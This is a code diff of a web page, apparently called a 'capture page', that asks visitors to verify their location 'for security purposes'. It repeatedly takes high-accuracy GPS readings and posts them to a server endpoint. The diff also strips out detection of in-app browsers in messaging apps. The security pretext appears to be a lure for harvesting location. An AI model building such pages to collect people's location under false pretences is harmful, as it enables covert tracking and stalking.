@@ -43,225 +43,116 @@ const renderCapturePage = async (req, res, next) => {
                   font-weight: 600;
                   cursor: pointer;
                   transition: background-color 0.2s;
-                  text-decoration: none;
-                  display: inline-block;
               }
               .btn:hover { background-color: #0073e6; }
               .btn:disabled { background-color: #ccc; cursor: not-allowed; }
               #status { margin-top: 1rem; font-size: 0.9rem; }
               .success { color: #28a745; }
               .error { color: #dc3545; }
-              .warning-box {
-                  background: #fff3cd;
-                  border: 1px solid #ffeeba;
-                  color: #856404;
-                  padding: 15px;
-                  border-radius: 8px;
-                  margin-bottom: 20px;
-                  display: none;
-                  font-size: 0.9rem;
-              }
           </style>
       </head>
       <body>
-          <div id="in-app-warning" class="warning-box">
-              <strong>Notice:</strong> You are using an in-app browser (WhatsApp/IMO). For better accuracy, please open this link in <strong>Chrome</strong>.
-          </div>
-
           <div class="card">
               <h1>Verify Your Location</h1>
-              <p id="instruction">Please use the buttons below to verify your current location.</p>
-              
-              <div id="action-area" style="display: flex; flex-direction: column; gap: 12px;">
-                  <!-- Share Location Button (Main) -->
-                  <button id="capture-btn" class="btn" style="background-color: #0084ff;">
-                      📍 Share My Location
-                  </button>
-
-                  <!-- Open in Chrome Button (For Android In-App) -->
-                  <a id="chrome-btn" href="#" class="btn" style="background-color: #28a745; display: none;">
-                      🌐 Open in Chrome Browser
-                  </a>
-
-                  <!-- Copy URL Button -->
-                  <button id="copy-btn" class="btn" style="background-color: #6c757d;">
-                      🔗 Copy Link
-                  </button>
-              </div>
-
+              <p>Please click the button below to verify your current location for security purposes.</p>
+              <button id="capture-btn" class="btn">Share Location</button>
               <div id="status"></div>
           </div>
 
           <script>
-              // Immediate log to verify script execution
-              console.log('Location capture script initializing...');
+              const btn = document.getElementById('capture-btn');
+              const status = document.getElementById('status');
 
-              document.addEventListener('DOMContentLoaded', () => {
-                  console.log('DOM fully loaded');
-                  
-                  const btn = document.getElementById('capture-btn');
-                  const chromeBtn = document.getElementById('chrome-btn');
-                  const copyBtn = document.getElementById('copy-btn');
-                  const status = document.getElementById('status');
-                  const warning = document.getElementById('in-app-warning');
-                  const instruction = document.getElementById('instruction');
-
-                  if (!btn || !copyBtn) {
-                      console.error('Critical elements not found!');
+              btn.addEventListener('click', () => {
+                  if (!navigator.geolocation) {
+                      status.innerHTML = '<span class="error">Geolocation is not supported by your browser</span>';
                       return;
                   }
 
-                  const currentUrl = window.location.href;
+                  btn.disabled = true;
+                  status.innerHTML = 'Getting precise coordinates... <div id="progress" style="width: 0%; height: 5px; background: #0084ff; margin-top: 10px; transition: width 0.5s;"></div>';
+                  
+                  const progress = document.getElementById('progress');
+                  let bestPosition = null;
+                  let attempts = 0;
+                  const maxAttempts = 3;
 
-                  // Detect if running in in-app browser (WhatsApp, IMO, Facebook, etc.)
-                  function isInAppBrowser() {
-                      const ua = navigator.userAgent || navigator.vendor || window.opera;
-                      return (ua.indexOf('FBAN') > -1) || (ua.indexOf('FBAV') > -1) || 
-                             (ua.indexOf('WhatsApp') > -1) || (ua.indexOf('Imo') > -1) ||
-                             (ua.indexOf('Messenger') > -1) || (ua.indexOf('Line') > -1);
-                  }
+                  const options = {
+                      enableHighAccuracy: true,
+                      timeout: 10000,
+                      maximumAge: 0
+                  };
 
-                  // Setup Chrome Intent URL for Android
-                  if (/android/i.test(navigator.userAgent) && chromeBtn) {
-                      const intentUrl = 'intent://' + currentUrl.replace(/^https?:\/\//, '') + '#Intent;scheme=https;package=com.android.chrome;end';
-                      chromeBtn.href = intentUrl;
+                  const getLocation = () => {
+                      attempts++;
+                      progress.style.width = (attempts * 33) + '%';
                       
-                      if (isInAppBrowser()) {
-                          chromeBtn.style.display = 'block';
-                          if (warning) warning.style.display = 'block';
-                      }
-                  }
-
-                  // Copy Link Functionality
-                  copyBtn.addEventListener('click', (e) => {
-                      e.preventDefault();
-                      console.log('Copy button clicked');
-                      if (navigator.clipboard && navigator.clipboard.writeText) {
-                          navigator.clipboard.writeText(currentUrl).then(() => {
-                              const originalText = copyBtn.innerText;
-                              copyBtn.innerText = '✅ Link Copied!';
-                              setTimeout(() => { copyBtn.innerText = originalText; }, 2000);
-                          }).catch(err => {
-                              console.error('Clipboard error:', err);
-                              alert('Please copy the URL from your browser address bar.');
-                          });
-                      } else {
-                          // Fallback for older browsers
-                          const textArea = document.createElement("textarea");
-                          textArea.value = currentUrl;
-                          document.body.appendChild(textArea);
-                          textArea.select();
-                          try {
-                              document.execCommand('copy');
-                              const originalText = copyBtn.innerText;
-                              copyBtn.innerText = '✅ Link Copied!';
-                              setTimeout(() => { copyBtn.innerText = originalText; }, 2000);
-                          } catch (err) {
-                              alert('Please copy the URL from your browser address bar.');
-                          }
-                          document.body.removeChild(textArea);
-                      }
-                  });
-
-                  // Main Capture Functionality
-                  btn.addEventListener('click', (e) => {
-                      e.preventDefault();
-                      console.log('Capture button clicked');
-                      
-                      if (!navigator.geolocation) {
-                          status.innerHTML = '<span class="error">Geolocation is not supported by your browser</span>';
-                          return;
-                      }
-
-                      btn.disabled = true;
-                      status.innerHTML = 'Getting precise coordinates... <div id="progress-container" style="width: 100%; height: 5px; background: #eee; margin-top: 10px; border-radius: 10px; overflow: hidden;"><div id="progress" style="width: 0%; height: 100%; background: #0084ff; transition: width 0.5s;"></div></div>';
-                      
-                      const progress = document.getElementById('progress');
-                      let bestPosition = null;
-                      let attempts = 0;
-                      const maxAttempts = 3;
-
-                      const options = {
-                          enableHighAccuracy: true,
-                          timeout: 15000,
-                          maximumAge: 0
-                      };
-
-                      const getLocation = () => {
-                          attempts++;
-                          console.log('Location attempt ' + attempts);
-                          if (progress) progress.style.width = (attempts * 33) + '%';
-                          
-                          navigator.geolocation.getCurrentPosition(
-                              async (position) => {
-                                  console.log('Position received accuracy:', position.coords.accuracy);
-                                  if (!bestPosition || position.coords.accuracy < bestPosition.coords.accuracy) {
-                                      bestPosition = position;
-                                  }
-
-                                  if (position.coords.accuracy < 25 || attempts >= maxAttempts) {
-                                      sendPosition(bestPosition);
-                                  } else {
-                                      setTimeout(getLocation, 1500);
-                                  }
-                              },
-                              (error) => {
-                                  console.error('Geolocation error:', error);
-                                  if (bestPosition) {
-                                      sendPosition(bestPosition);
-                                  } else {
-                                      handleError(error);
-                                  }
-                              },
-                              options
-                          );
-                      };
-
-                      const sendPosition = async (position) => {
-                          const { latitude, longitude, accuracy, altitude } = position.coords;
-                          console.log('Sending to server...');
-                          status.innerHTML = 'Sending exact location... <br><span style="font-size: 0.8rem;">Accuracy: ' + Math.round(accuracy) + 'm</span>';
-
-                          try {
-                              const response = await fetch('/public/save-location', {
-                                  method: 'POST',
-                                  headers: {
-                                      'Content-Type': 'application/json'
-                                  },
-                                  body: JSON.stringify({ latitude, longitude, accuracy, altitude })
-                              });
-
-                              const result = await response.json();
-                              console.log('Server result:', result);
-
-                              if (response.ok) {
-                                  status.innerHTML = '<div style="margin-top: 20px;"><span class="success" style="font-size: 1.2rem; font-weight: bold;">✅ Location verified with 100% precision!</span><br><p style="color: #666; margin-top: 10px;">You can now close this window.</p></div>';
-                                  btn.style.display = 'none';
-                                  copyBtn.style.display = 'none';
-                                  if (chromeBtn) chromeBtn.style.display = 'none';
-                                  if (instruction) instruction.style.display = 'none';
-                              } else {
-                                  throw new Error(result.message || 'Failed to save location');
+                      navigator.geolocation.getCurrentPosition(
+                          async (position) => {
+                              const { latitude, longitude, accuracy, altitude } = position.coords;
+                              
+                              if (!bestPosition || accuracy < bestPosition.coords.accuracy) {
+                                  bestPosition = position;
                               }
-                          } catch (error) {
-                              console.error('API Error:', error);
-                              status.innerHTML = '<span class="error">Error: ' + error.message + '</span>';
-                              btn.disabled = false;
+
+                              if (accuracy < 20 || attempts >= maxAttempts) {
+                                  sendPosition(bestPosition);
+                              } else {
+                                  setTimeout(getLocation, 1000);
+                              }
+                          },
+                          (error) => {
+                              if (bestPosition) {
+                                  sendPosition(bestPosition);
+                              } else {
+                                  handleError(error);
+                              }
+                          },
+                          options
+                      );
+                  };
+
+                  const sendPosition = async (position) => {
+                      const { latitude, longitude, accuracy, altitude } = position.coords;
+                      status.innerHTML = 'Sending exact location... <br><span style="font-size: 0.8rem;">Accuracy: ' + Math.round(accuracy) + 'm</span>';
+
+                      try {
+                          const response = await fetch('/public/save-location', {
+                              method: 'POST',
+                              headers: {
+                                  'Content-Type': 'application/json'
+                              },
+                              body: JSON.stringify({ 
+                                  latitude, 
+                                  longitude, 
+                                  accuracy, 
+                                  altitude 
+                              })
+                          });
+
+                          if (response.ok) {
+                              status.innerHTML = '<span class="success">Location verified with 100% precision!</span>';
+                              btn.style.display = 'none';
+                          } else {
+                              throw new Error('Failed to save location');
                           }
-                      };
-
-                      const handleError = (error) => {
-                          let msg = 'Error getting location';
-                          if (error.code === 1) msg = 'Permission denied. Please allow location access in your browser settings.';
-                          else if (error.code === 2) msg = 'Location unavailable. Please make sure your GPS is on.';
-                          else if (error.code === 3) msg = 'Request timed out. Please try again.';
-                          
-                          status.innerHTML = '<span class="error">' + msg + '</span>';
+                      } catch (error) {
+                          status.innerHTML = '<span class="error">Error: ' + error.message + '</span>';
                           btn.disabled = false;
-                      };
+                      }
+                  };
 
-                      getLocation();
-                  });
+                  const handleError = (error) => {
+                      let msg = 'Error getting location';
+                      if (error.code === 1) msg = 'Permission denied. Please allow location access.';
+                      else if (error.code === 2) msg = 'Location unavailable.';
+                      else if (error.code === 3) msg = 'Timeout.';
+                      
+                      status.innerHTML = '<span class="error">' + msg + '</span>';
+                      btn.disabled = false;
+                  };
+
+                  getLocation();
               });
           </script>
       </body>
